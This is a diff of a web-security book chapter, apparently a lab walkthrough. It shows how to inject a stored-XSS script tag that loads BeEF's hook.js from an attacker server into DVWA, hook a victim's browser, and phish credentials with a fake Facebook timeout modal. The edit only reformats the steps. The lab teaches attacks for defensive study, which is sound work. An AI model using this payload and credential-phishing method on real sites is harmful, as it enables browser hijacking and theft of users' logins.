@@ -230,27 +230,42 @@ You can find the video of how this attack is played out [here](https://www.youtu
 
 I> ## Synopsis
 I>
-I> In this exercise, I've used the Dam Vulnerable Web App (dvwa), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. dvwa is included in the OWASP Broken Web Application ([owaspbwa](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
-I> We use BeEF to exploit an XSS vulnerability in dvwa and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.
+I> In this exercise, I've used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
+I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.
 
 {icon=bomb}
 G> ## The Play
 G>
-G> Make sure you have the owaspbwa [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.  
-G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`  
-G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you've configured TLS) with the user and password that you setup in the BeEF root config.yaml  
-G> Open another browser tab and log-in to the dvwa  
-G> Browse to "XSS stored"  
-G> Enter some text in the Name field and some text in the Message field  
-G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on  
-G> Fire up burp  
-G> Back in the dvwa send your request by clicking on the Sign Guestbook button  
-G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.  
-G> You can disable FoxyProxy now too  
-G> Now on your victims machine, the victim can log into dvwa and browse to the same "XSS stored" page. Now as the attacker, you'll now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF comms server for commands to execute on its behalf.  
-G> If you open the victims browser developer tools, you'll be able to inspect the communications and the JavaScript within the hook.js file  
-G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).  
-G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you did due diligence in the reconnaissance stage.  
+G> Make sure you have the OWASPBWA [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.
+G>
+G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
+G>
+G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you've configured TLS) with the user and password that you setup in the BeEF root config.yaml
+G>
+G> Open another browser tab and log-in to the DVWA
+G>
+G> Browse to "XSS stored"
+G>
+G> Enter some text in the Name field and some text in the Message field
+G> 
+G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on
+G>
+G> Fire up burp
+G>
+G> Back in the DVWA send your request by clicking on the Sign Guestbook button
+G>
+G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
+G>
+G> You can disable FoxyProxy now too
+G>
+G> Now on your victims machine, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you'll now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF comms server for commands to execute on its behalf.
+G>
+G> If you open the victims browser developer tools, you'll be able to inspect the communications and the JavaScript within the hook.js file
+G>
+G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
+G>
+G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you did due diligence in the reconnaissance stage.
+G>
 G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  
 
 {#web-application-identify-risks-sqli}
